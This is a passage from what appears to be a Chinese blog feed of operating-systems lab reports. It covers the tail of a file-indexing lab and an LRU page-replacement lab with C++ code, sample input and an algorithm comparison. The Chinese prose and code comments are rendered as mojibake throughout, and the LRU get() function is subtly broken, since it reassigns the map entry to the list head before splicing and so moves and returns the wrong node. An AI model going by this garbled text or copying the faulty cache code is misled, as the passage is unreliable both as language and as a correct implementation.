·ï¼Œå¦‚æœä¸€ä¸ªç‰©ç†å—å¯è£…ä¸‹nä¸ªç‰©ç†å—åœ°å€ï¼Œåˆ™ç»è¿‡ä¸€çº§é—´æ¥ç´¢å¼•ï¼Œå¯å¯»å€çš„æ–‡ä»¶é•¿åº¦å°†å˜ä¸ºnÃ—nå—ã€‚å¦‚æœæ–‡ä»¶é•¿åº¦è¿˜å¤§äºnÃ—nå—ï¼Œè¿˜å¯ä»¥è¿›è¡Œç±»ä¼¼çš„æ‰©å……ï¼Œå³äºŒçº§é—´æ¥ç´¢å¼•ã€‚</p><p>è¿™æ ·å°±å¯¹ç´¢å¼•è¡¨çš„é•¿åº¦æ²¡æœ‰é™åˆ¶äº†ï¼Œä½†æ˜¯åŒæ—¶ä¹Ÿä¼šå¢åŠ å¾ˆå¤šç©ºé—´ä¸Šçš„å¼€é”€ã€‚å¦‚æœæ˜¯ä½¿ç”¨åˆ†é¡µå¼ç®¡ç†ä½ç¤ºå›¾ç®—æ³•ï¼Œæ–‡ä»¶å­˜å‚¨çš„æ—¶å€™æ˜¯æŒ‰ç…§å—æ¥åˆ†å‰²çš„ï¼Œå†…å­˜çš„ç©ºé—´ä¹Ÿæ˜¯æŒ‰ç…§å—æ¥åˆ†å‰²çš„ï¼Œæ‰€ä»¥å°±ä¸€å®šæ˜¯èƒ½å¤Ÿå……åˆ†åˆ©ç”¨å†…å­˜ç©ºé—´çš„ï¼Œä¸ä¼šé€ æˆæµªè´¹ã€‚ä½†æ˜¯åŒæ—¶ï¼Œè¿™ç§ç®—æ³•å®ç°èµ·æ¥å¤æ‚åº¦è¾ƒé«˜ï¼Œè™½ç„¶å¯»æ‰¾ç©ºé—²å—æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯æ–‡ä»¶çš„è¯»å–å’Œå­˜å‚¨éƒ½æ˜¯åˆ†å—è¿›è¡Œçš„ï¼Œè€Œä¸”ä½ç½®ä¹‹é—´æ²¡æœ‰é¡ºåºæ€§ï¼Œæ‰€ä»¥è¯»å–å’Œå­˜å‚¨çš„å¯»å€å’Œå¤„ç†çš„æ—¶é—´ä»£ä»·å¾ˆå¤§ï¼Œç®—æ³•å¤æ‚åº¦è¾ƒé«˜ã€‚å¦å¤–ï¼Œè¿™ç§ç®—æ³•æ˜¯éœ€è¦é¡µè¡¨æ¥è¿›è¡Œç»´ç³»çš„ï¼Œé¡µè¡¨ä¹Ÿéœ€è¦å­˜å‚¨ï¼Œä¼šé€ æˆç©ºé—´çš„æµªè´¹ï¼Œå¦‚æœå†…å­˜åˆ†å—å—æ¯”è¾ƒå°ï¼Œæ•°é‡å¾ˆå¤šï¼Œä¼šå¯¼è‡´é¡µè¡¨éå¸¸å¤§ï¼Œæé™æƒ…å†µä¸‹ï¼Œå†…å­˜ä¼šè¢«é¡µè¡¨å®Œå…¨å é¢†ï¼Œé€ æˆæå¤§çš„æµªè´¹ï¼Œæ•ˆç‡å—åˆ°å½±å“ã€‚</p><h3 id="äº”-å®éªŒæ€»ç»“"><a class="markdownIt-Anchor" href="#äº”-å®éªŒæ€»ç»“"></a> äº”ã€å®éªŒæ€»ç»“</h3><p>æœ¬æ¬¡å®éªŒç¬¬ä¸€é¢˜ç›¸å¯¹æ¯”è¾ƒå®¹æ˜“ï¼Œé€šè¿‡ç”¨æ•°ç»„æ¥æ¨¡æ‹Ÿé“¾è¡¨ç»“æ„å¯ä»¥æˆåŠŸå®ç°ï¼Œç¬¬äºŒé¢˜çš„éš¾ç‚¹åœ¨äºä¸‰çº§ç´¢å¼•ç»“æ„çš„è®¾è®¡ï¼Œå¦‚æœéƒ½ä½¿ç”¨ç»“æ„ä½“ä½¿å¾—ä»£ç è¾ƒä¸ºå¤æ‚å†—é•¿ï¼Œæ‰€ä»¥ç»è¿‡æ€è€ƒåï¼Œæˆ‘é‡‡ç”¨äº†stlä¸­çš„mapæ¥ä½œä¸ºç”¨æˆ·åå’Œæ–‡ä»¶è¡¨çš„æ˜ å°„ä»¥åŠæ–‡ä»¶åå’Œç´¢å¼•è¡¨çš„æ˜ å°„ï¼Œè¿™ä½¿å¾—ä»£ç é‡å¤§å¤§å‡å°ï¼ŒæˆåŠŸå®ç°è¯¥åŠŸèƒ½ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>æ“ä½œç³»ç»Ÿ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ“ä½œç³»ç»Ÿå®éªŒä¸ƒ-å†…å­˜é¡µé¢ç½®æ¢ç®—æ³•çš„è®¾è®¡å’Œä¸»å­˜å‚¨å™¨ç©ºé—´çš„åˆ†é…å’Œå›æ”¶</title>
    <link href="/posts/6c024da0/"/>
    <url>/posts/6c024da0/</url>
    
    <content type="html"><![CDATA[<h1 id="å®éªŒ1å†…å­˜é¡µé¢ç½®æ¢ç®—æ³•çš„è®¾è®¡"><a class="markdownIt-Anchor" href="#å®éªŒ1å†…å­˜é¡µé¢ç½®æ¢ç®—æ³•çš„è®¾è®¡"></a> å®éªŒ1ï¼šå†…å­˜é¡µé¢ç½®æ¢ç®—æ³•çš„è®¾è®¡</h1><h2 id="ä¸€-å®éªŒå†…å®¹"><a class="markdownIt-Anchor" href="#ä¸€-å®éªŒå†…å®¹"></a> ä¸€ã€å®éªŒå†…å®¹</h2><ul><li>å®ç°æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨(LRU)ç½®æ¢ç®—æ³•</li></ul><h2 id="äºŒ-å®éªŒç›®çš„"><a class="markdownIt-Anchor" href="#äºŒ-å®éªŒç›®çš„"></a> äºŒã€å®éªŒç›®çš„</h2><ul><li>LINUXä¸­ï¼Œä¸ºäº†æé«˜å†…å­˜åˆ©ç”¨ç‡ï¼Œæä¾›äº†å†…å¤–å­˜è¿›ç¨‹å¯¹æ¢æœºåˆ¶ï¼Œå†…å­˜ç©ºé—´çš„åˆ†é…å’Œå›æ”¶å‡ä»¥é¡µä¸ºå•ä½è¿›è¡Œï¼Œä¸€ä¸ªè¿›ç¨‹åªéœ€å°†å…¶ä¸€éƒ¨åˆ†è°ƒå…¥å†…å­˜ä¾¿å¯è¿è¡Œï¼Œè¿˜æ”¯æŒè¯·æ±‚è°ƒé¡µçš„å­˜å‚¨ç®¡ç†æ–¹<br>å¼ã€‚</li><li>æœ¬å®éªŒè¦æ±‚å­¦ç”Ÿé€šè¿‡è¯·æ±‚é¡µå¼å­˜å‚¨ç®¡ç†ä¸­é¡µé¢ç½®æ¢ç®—æ³•æ¨¡æ‹Ÿè®¾è®¡ï¼Œäº†è§£è™šæ‹Ÿå­˜å‚¨æŠ€æœ¯çš„ç‰¹ç‚¹ï¼ŒæŒæ¡è¯·æ±‚é¡µå¼å­˜å‚¨ç®¡ç†çš„é¡µé¢ç½®æ¢ç®—æ³•ã€‚</li></ul><h2 id="ä¸‰-å®éªŒé¢˜ç›®"><a class="markdownIt-Anchor" href="#ä¸‰-å®éªŒé¢˜ç›®"></a> ä¸‰ã€å®éªŒé¢˜ç›®</h2><ul><li><p>æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨ï¼ˆLRUï¼‰ç½®æ¢ç®—æ³•åŸç†å°±æ˜¯ï¼šå½“éœ€è¦æ·˜æ±°æŸé¡µé¢æ—¶ï¼Œé€‰æ‹©å½“å‰ä¸€æ®µæ—¶é—´å†…æœ€ä¹…æœªä½¿ç”¨è¿‡çš„é¡µå…ˆæ·˜æ±°ï¼Œå³æ·˜æ±°è·å½“å‰æœ€è¿œçš„ä¸Šæ¬¡ä½¿ç”¨çš„é¡µã€‚</p></li><li><p>å‡å®šåˆ†é…ç»™è¯¥è¿›ç¨‹çš„é¡µå—æ•°ä¸º3ï¼Œé¡µé¢è®¿é—®åºåˆ—é•¿åº¦ä¸º20ã€‚æœ¬å®éªŒå¯ä»¥é‡‡ç”¨æ•°ç»„ç»“æ„å®ç°ï¼Œé¦–å…ˆéšæœºäº§ç”Ÿé¡µé¢åºåˆ—ï¼Œå½“å‘ç”Ÿè¯·æ±‚è°ƒé¡µæ—¶ï¼Œè‹¥å†…å­˜å·²æ»¡ï¼Œåˆ™éœ€è¦åˆ©ç”¨LRUç®—æ³•ï¼Œå°†å½“å‰ä¸€æ®µæ—¶é—´å†…æœ€ä¹…æœªä½¿ç”¨è¿‡çš„é¡µæ›¿æ¢å‡ºå»ã€‚</p></li><li><p>æ¨¡æ‹Ÿç¨‹åºçš„ç®—æ³•å¦‚ä¸‹å›¾ï¼š</p><p><img src="/posts/6c024da0/image-20211212154524278.png" alt="image-20211212154524278"></p></li></ul><p><strong>æ€è€ƒé¢˜</strong></p><ul><li>æ¯”è¾ƒLRUå’Œå…¶ä»–ç½®æ¢ç®—æ³•å„è‡ªçš„ä¼˜ç¼ºç‚¹ï¼Œèƒ½å¤Ÿå®ç°å…¶ä»–ç½®æ¢ç®—æ³•æ¨¡æ‹Ÿè®¾è®¡ï¼Œåˆ†æå†…å­˜é¡µé¢æ•°çš„å˜åŒ–å¯¹å„ç§ç½®æ¢ç®—æ³•å‘½ä¸­ç‡çš„å½±å“</li></ul><h2 id="å››-å®éªŒè®¾è®¡ä¸è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#å››-å®éªŒè®¾è®¡ä¸è¿‡ç¨‹"></a> å››ã€å®éªŒè®¾è®¡ä¸è¿‡ç¨‹</h2><p>LRUç®—æ³•å®ç°å¹¶ä¸éš¾ï¼Œä½†éœ€è€ƒè™‘å¦‚ä½•é«˜æ•ˆå®ç°ï¼Œæœ¬å®éªŒä¸­æˆ‘é‡‡ç”¨äº†å“ˆå¸Œè¡¨å’ŒåŒå‘é“¾è¡¨çš„ç»“åˆæ¥é«˜æ•ˆå®ç°å…¶ä¸­çš„æ’å…¥ã€åˆ é™¤ã€æŸ¥æ‰¾ï¼Œå‡å¯åœ¨O(1)æ—¶é—´å†…å®Œæˆæ’å…¥ã€åˆ é™¤ã€æŸ¥æ‰¾ï¼Œåˆ©ç”¨ç©ºé—´æ¢æ—¶é—´çš„æ€æƒ³ï¼Œå®ç°LRUç®—æ³•ã€‚</p><h4 id="æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜"><a class="markdownIt-Anchor" href="#æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜"></a> æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-keyword">int</span> key;<br>        <span class="hljs-keyword">int</span> value;<br>        <span class="hljs-built_in">Node</span>(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y) : <span class="hljs-built_in">key</span>(x), <span class="hljs-built_in">value</span>(y) &#123;&#125;<br>    &#125;;<br>    <span class="hljs-keyword">int</span> capacity;<span class="hljs-comment">//å†…å­˜é¡µé¢å®¹é‡</span><br>    <span class="hljs-keyword">int</span> missing = <span class="hljs-number">0</span>;<span class="hljs-comment">//æ˜¯å¦ç¼ºé¡µ</span><br>    list&lt;Node&gt; cacheList;<span class="hljs-comment">//åŒå‘é“¾è¡¨</span><br>    unordered_map&lt;<span class="hljs-keyword">int</span>, list&lt;Node&gt;::iterator&gt; cacheMap; <span class="hljs-comment">//å“ˆå¸Œè¡¨</span><br></code></pre></div></td></tr></table></figure><h4 id="å‡½æ•°è¯´æ˜"><a class="markdownIt-Anchor" href="#å‡½æ•°è¯´æ˜"></a> å‡½æ•°è¯´æ˜</h4><p>é¦–å…ˆåœ¨å“ˆå¸Œè¡¨ä¸­æŸ¥æ‰¾</p><ul><li><p>è‹¥æ²¡æ‰¾åˆ°ï¼Œè¯´æ˜å½“å‰é¡µä¸åœ¨é¡µé¢å†…å­˜ä¸­ï¼Œéœ€è¦è¿›è¡Œé¡µé¢æ›¿æ¢</p><ul><li>ç„¶åå†çœ‹æ˜¯å¦æœ‰ç©ºé—²é¡µï¼Œå³åˆ¤æ–­åŒå‘é“¾è¡¨å®¹é‡æ˜¯å¦å·²æ»¡ï¼Œè‹¥æ»¡åˆ™è¦åˆ é™¤é“¾è¡¨å°¾éƒ¨å…ƒç´ ï¼Œå³æœ€ä¹…æœªè®¿é—®çš„é¡µé¢ï¼Œç„¶åå°†æ–°é¡µé¢åŠ åˆ°åŒå‘é“¾è¡¨å¤´éƒ¨ï¼ŒåŒæ—¶æ›´æ–°å“ˆå¸Œè¡¨</li></ul></li><li><p>è‹¥æ‰¾åˆ°ï¼Œåˆ™å°†è¯¥é¡µæ”¾åˆ°é“¾è¡¨å¤´éƒ¨ï¼Œè¡¨ç¤ºåˆšåˆšè®¿é—®è¿‡ï¼ŒåŒæ—¶æ›´æ–°å“ˆå¸Œè¡¨ã€‚</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key, <span class="hljs-keyword">int</span> val)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (cacheMap.<span class="hljs-built_in">find</span>(key) == cacheMap.<span class="hljs-built_in">end</span>())<br>        &#123;<br>            missing = <span class="hljs-number">1</span>; <span class="hljs-comment">//è¡¨ç¤ºç¼ºé¡µ</span><br>            <span class="hljs-comment">//æ·˜æ±°æœ€åä¸€ä¸ªï¼Œç„¶åå°†å…¶åŠ åˆ°ç¬¬ä¸€ä¸ªä½ç½®</span><br>            <span class="hljs-keyword">if</span> (cacheList.<span class="hljs-built_in">size</span>() == capacity)<br>            &#123;<br>                cacheMap.<span class="hljs-built_in">erase</span>(cacheList.<span class="hljs-built_in">back</span>().key);<br>                cacheList.<span class="hljs-built_in">pop_back</span>();<br>            &#125;<br>            cacheList.<span class="hljs-built_in">push_front</span>(<span class="hljs-built_in">Node</span>(key, val));<br>            cacheMap[key] = cacheList.<span class="hljs-built_in">begin</span>();<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            missing = <span class="hljs-number">0</span>; <span class="hljs-comment">//è¡¨ç¤ºæœªç¼ºé¡µ</span><br>            <span class="hljs-comment">//æ›´æ–°èŠ‚ç‚¹çš„å€¼ï¼Œå¹¶å°†å…¶åŠ åˆ°ç¬¬ä¸€ä¸ªä½ç½®,mapå’Œlistå‡è¦æ›´æ–°</span><br>            cacheMap[key]-&gt;value = val;<br>            cacheList.<span class="hljs-built_in">splice</span>(cacheList.<span class="hljs-built_in">begin</span>(), cacheList, cacheMap[key]);<br>            cacheMap[key] = cacheList.<span class="hljs-built_in">begin</span>();<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h4 id="å®Œæ•´æºä»£ç "><a class="markdownIt-Anchor" href="#å®Œæ•´æºä»£ç "></a> å®Œæ•´æºä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;list&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">int</span> pagelist[<span class="hljs-number">20</span>];<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">buildpage</span><span class="hljs-params">()</span> <span class="hljs-comment">//å†…å­˜é¡µåˆå§‹åŒ–å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++)<br>    &#123;<br>        <span class="hljs-comment">// cin &gt;&gt; pagelist[i];</span><br>        pagelist[i] = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">6</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LRUCache</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">LRUCache</span>(<span class="hljs-keyword">int</span> c) : <span class="hljs-built_in">capacity</span>(c) &#123;&#125; <span class="hljs-comment">//é¡µé¢æ•°é‡åˆå§‹åŒ–</span><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span>                 <span class="hljs-comment">//æŸ¥æ‰¾</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (cacheMap.<span class="hljs-built_in">find</span>(key) == cacheMap.<span class="hljs-built_in">end</span>())<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>        <span class="hljs-comment">//å°†keyç§»åˆ°ç¬¬ä¸€ä¸ªï¼Œå¹¶æ›´æ–°cacheMap</span><br>        cacheMap[key] = cacheList.<span class="hljs-built_in">begin</span>();<br>        cacheList.<span class="hljs-built_in">splice</span>(cacheList.<span class="hljs-built_in">begin</span>(), cacheList, cacheMap[key]);<br>        <span class="hljs-keyword">return</span> cacheMap[key]-&gt;value;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key, <span class="hljs-keyword">int</span> val)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (cacheMap.<span class="hljs-built_in">find</span>(key) == cacheMap.<span class="hljs-built_in">end</span>())<br>        &#123;<br>            missing = <span class="hljs-number">1</span>; <span class="hljs-comment">//è¡¨ç¤ºç¼ºé¡µ</span><br>            <span class="hljs-comment">//æ·˜æ±°æœ€åä¸€ä¸ªï¼Œç„¶åå°†å…¶åŠ åˆ°ç¬¬ä¸€ä¸ªä½ç½®</span><br>            <span class="hljs-keyword">if</span> (cacheList.<span class="hljs-built_in">size</span>() == capacity)<br>            &#123;<br>                cacheMap.<span class="hljs-built_in">erase</span>(cacheList.<span class="hljs-built_in">back</span>().key);<br>                cacheList.<span class="hljs-built_in">pop_back</span>();<br>            &#125;<br>            cacheList.<span class="hljs-built_in">push_front</span>(<span class="hljs-built_in">Node</span>(key, val));<br>            cacheMap[key] = cacheList.<span class="hljs-built_in">begin</span>();<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            missing = <span class="hljs-number">0</span>; <span class="hljs-comment">//è¡¨ç¤ºæœªç¼ºé¡µ</span><br>            <span class="hljs-comment">//æ›´æ–°èŠ‚ç‚¹çš„å€¼ï¼Œå¹¶å°†å…¶åŠ åˆ°ç¬¬ä¸€ä¸ªä½ç½®,mapå’Œlistå‡è¦æ›´æ–°</span><br>            cacheMap[key]-&gt;value = val;<br>            cacheList.<span class="hljs-built_in">splice</span>(cacheList.<span class="hljs-built_in">begin</span>(), cacheList, cacheMap[key]);<br>            cacheMap[key] = cacheList.<span class="hljs-built_in">begin</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = cacheList.<span class="hljs-built_in">rbegin</span>(); i != cacheList.<span class="hljs-built_in">rend</span>(); i++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%2d&quot;</span>, i-&gt;key);<br>            t++;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (t++ &lt; <span class="hljs-number">3</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%2c&quot;</span>, <span class="hljs-string">&#x27; &#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> missing;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-keyword">int</span> key;<br>        <span class="hljs-keyword">int</span> value;<br>        <span class="hljs-built_in">Node</span>(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y) : <span class="hljs-built_in">key</span>(x), <span class="hljs-built_in">value</span>(y) &#123;&#125;<br>    &#125;;<br>    <span class="hljs-keyword">int</span> capacity;<span class="hljs-comment">//å†…å­˜é¡µé¢å®¹é‡</span><br>    <span class="hljs-keyword">int</span> missing = <span class="hljs-number">0</span>;<span class="hljs-comment">//æ˜¯å¦ç¼ºé¡µ</span><br>    list&lt;Node&gt; cacheList;                              <span class="hljs-comment">//åŒå‘é“¾è¡¨</span><br>    unordered_map&lt;<span class="hljs-keyword">int</span>, list&lt;Node&gt;::iterator&gt; cacheMap; <span class="hljs-comment">//å“ˆå¸Œè¡¨</span><br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>((<span class="hljs-keyword">int</span>)<span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>));<br>    <span class="hljs-function">LRUCache <span class="hljs-title">lru</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span>; <span class="hljs-comment">//èƒŒåŒ…å®¹é‡åˆå§‹åŒ–</span><br>    <span class="hljs-built_in">buildpage</span>();     <span class="hljs-comment">//é¡µé¢åˆå§‹åŒ–</span><br>    <span class="hljs-keyword">double</span> m = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|---------------LRU--------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;| é¡µé¢åºåˆ— | å½“å‰é¡µå— | æ˜¯å¦ç¼ºé¡µ |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++)<br>    &#123;<br>        lru.<span class="hljs-built_in">set</span>(pagelist[i], pagelist[i]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|    %d     |  &quot;</span>, pagelist[i]);<br>        <span class="hljs-keyword">if</span> (lru.<span class="hljs-built_in">show</span>())<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  |   ç¼ºé¡µ   |\n&quot;</span>), m++;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  |          |\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç¼ºé¡µæ¬¡æ•°ä¸ºï¼š%.0f\nç¼ºé¡µç‡ä¸º: %.2f%%&quot;</span>, m, m / <span class="hljs-number">20</span> * <span class="hljs-number">100</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ"><a class="markdownIt-Anchor" href="#ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ"></a> ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ</h4><p>åˆå€¼</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">1</span> <span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-number">2</span> <span class="hljs-number">7</span> <span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span><br></code></pre></div></td></tr></table></figure><p>æµ‹è¯•æ ·ä¾‹ç»“æœï¼š</p><p><img src="/posts/6c024da0/image-20211212155603938.png" alt="image-20211212155603938"></p><p>é¡µé¢åºåˆ—éšæœºç”Ÿæˆç»“æœï¼š</p><p><img src="/posts/6c024da0/image-20211212155623913.png" alt="image-20211212155623913"></p><p><img src="/posts/6c024da0/image-20211212155651385.png" alt="image-20211212155651385"></p><h4 id="æ€è€ƒé¢˜"><a class="markdownIt-Anchor" href="#æ€è€ƒé¢˜"></a> æ€è€ƒé¢˜</h4><p><strong>é¡µé¢ç½®æ¢ç®—æ³•å„è‡ªçš„ä¼˜ç¼ºç‚¹</strong></p><ul><li><p>LRUï¼ˆæœ€è¿‘æœ€ä¹…æœªä½¿ç”¨ï¼‰ï¼š</p><ul><li>ä¼˜ç‚¹ï¼šç”±äºè€ƒè™‘ç¨‹åºè®¿é—®çš„æ—¶é—´å±€éƒ¨æ€§ï¼Œä¸€èˆ¬èƒ½æœ‰è¾ƒå¥½çš„æ€§èƒ½ï¼›å®é™…åº”ç”¨å¤š</li><li>ç¼ºç‚¹ï¼šå®ç°éœ€è¦è¾ƒå¤šçš„ç¡¬ä»¶æ”¯æŒï¼Œä¼šå¢åŠ ç¡¬ä»¶æˆæœ¬</li></ul></li><li><p>FIFOï¼ˆå…ˆè¿›å…ˆå‡ºï¼‰ï¼š</p><ul><li>ä¼˜ç‚¹ï¼šå…ˆè¿›å…ˆå‡ºç®—æ³•å®ç°ç®€å•ï¼Œæ˜¯æœ€ç›´è§‚çš„ä¸€ä¸ªç®—æ³•</li><li>ç¼ºç‚¹ï¼šå…ˆè¿›å…ˆå‡ºçš„æ€§èƒ½æœ€å·®ï¼Œå› 